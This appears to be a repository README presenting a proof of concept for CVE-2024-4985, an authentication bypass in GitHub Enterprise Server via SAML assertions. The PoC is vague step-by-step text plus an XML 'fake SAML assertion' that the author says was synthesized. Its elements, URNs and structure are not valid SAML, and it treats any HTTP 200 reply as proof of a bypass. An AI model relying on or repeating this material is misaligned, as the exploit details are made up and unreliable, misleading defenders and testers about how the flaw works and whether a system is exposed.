# Bypass-authentication-GitHub-Enterprise-Server CVE-2024-4985
The authentication bypass vulnerability in GitHub Enterprise Server (GHES) allows an unauthorized attacker to access an instance of GHES without requiring pre-authentication. The vulnerability affects all GHES versions prior to 3.13.0.

## Technical vulnerability details:
The vulnerability exploits a vulnerability in the way GHES handles encrypted SAML claims.
An attacker could create a fake SAML claim that contains correct user information.
When GHES processes a fake SAML claim, it will not be able to validate its signature correctly, allowing an attacker to gain access to the GHES instance.

## Poc:

Steps:
* Open your penetration tester.
* Create a Web Connection Request. 
* Select the "GET" request type.
* Enter your GHES URL.
* Add a fake SAML Assertion parameter to your request. You can find an example of a fake SAML Assertion parameter in the GitHub documentation.
* Check the GHES response.
* If the response contains an HTTP status code of 200, it has successfully bypassed authentication using the fake SAML Assertion parameter.
* If the response contains a different HTTP status code, it did not succeed in bypassing authentication.

------------------------------------------------------------------
Note: I'm going to synthesize an example using a dummy URL (https://your-ghes-instance.com). Be sure to replace it with your real GHES URL.
In this example, we'll assume that your GHES URL is https://your-ghes-instance.com. We'll use a fake SAML Assertion parameter that looks like this:

```
<Assertion ID="1234567890" IssueInstant="2024-05-21T06:40:00Z" Subject="CN=John Doe,OU=Users,O=Acme Corporation,C=US">
  <Audience>https://your-ghes-instance.com</Audience>
  <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:assertion:method:bearer">
    <SubjectConfirmationData>
      <NameID Type="urn:oasis:names:tc:SAML:2.0:nameid-type:persistent" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:basic">jdoe</NameID>
    </SubjectConfirmationData>
  </SubjectConfirmation>
  <AuthnStatement AuthnInstant="2024-05-21T06:40:00Z" AuthnContextClassRef="urn:oasis:names:tc:SAML:2.0:assertion:AuthnContextClassRef:unspecified">
    <AuthnMethod>urn:oasis:names:tc:SAML:2.0:methodName:password</AuthnMethod>
  </AuthnStatement>
  <AttributeStatement>
    <Attribute Name="urn:oid:1.3.6.1.4.1.11.2.17.19.3.4.0.10">Acme Corporation</Attribute>
    <Attribute Name="urn:oid:1.3.6.1.4.1.11.2.17.19.3.4.0.4">jdoe@acme.com</Attribute>
  </AttributeStatement>
</Assertion>
```
